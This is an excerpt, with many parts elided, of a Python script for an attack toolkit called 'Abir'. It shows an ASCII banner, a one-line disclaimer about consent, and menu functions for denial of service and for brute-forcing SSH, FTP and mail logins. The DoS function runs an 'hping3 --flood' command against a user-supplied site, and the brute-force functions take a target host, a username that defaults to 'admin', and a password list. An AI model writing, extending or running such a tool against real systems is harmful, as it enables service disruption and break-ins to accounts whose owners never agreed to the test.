...
|  $$$$$$ | $$      | $$$$$$$$| $$ $$ $$| $$ $$ $$  | $$  | $$ $$ $$| $$ /$$$$      
 ...
 /$$  \ $$| $$    $$| $$  | $$| $$\  $$$| $$\  $$$  | $$  | $$\  $$$| $$  \ $$      
|  $$$$$$/|  $$$$$$/| $$  | $$| $$ \  $$| $$ \  $$ /$$$$$$| $$ \  $$|  $$$$$$/      
 \______/  \______/ |__/  |__/|__/  \__/|__/  \__/|______/|__/  \__/ \______/                                             
...
def desc():
    ...
    Usage of Abir for attacking targets without prior mutual consent is illegal.
...
def Dos():
	...
	banner()
	print('Enter site:')
	site = input(B+'Abir»Dos»'+E)
	print('''Enter level:
		1) High dos
		2) Dos port
 		3) Low dos''')
	level = int(input(B+'Abir»Dos»Level»'+E))
	if level == 1:
		os.system('hping3 -S -P --flood -V '+site)
	if level == 2:
		port = input(B+'Abir»Dos»Level»Port»'+E)
...
def SSH_Brut():
	...
	try:
		...
		host = input(W+'Abir»SSH»Host»'+E)
		print(G+'Enter username:'+E)
		print(G+'Default: admin'+E)
		user = input(W+'Abir»SSH»User»'+E)
		if user == "":
			user = 'admin'
		print(G+'Enter password file:'+E)
		password = input(W+'Abir»SSH»Password»'+E)
...
def FTP_Brut():
	...
	host = input(W+'Abir»Ftp»Host»'+E)
	print(B+'Enter user:'+E)
	print(F+'Default: admin')
	user = input(W+'Abir»Ftp»User»'+E)
	print(B+'Enter password file:'+E)
	password_list = input(W+'Abir»Ftp»Password»'+E)
	if user == '':
		user = 'admin'
	if password_list == '':
...
def mail():
	...
	mail = input(W+'Abir»Mail»Login»'+E)
	print(B+'Enter password list:'+E)
	password = input(W+'Abir»Mail»Password»'+E)
	if password == '':
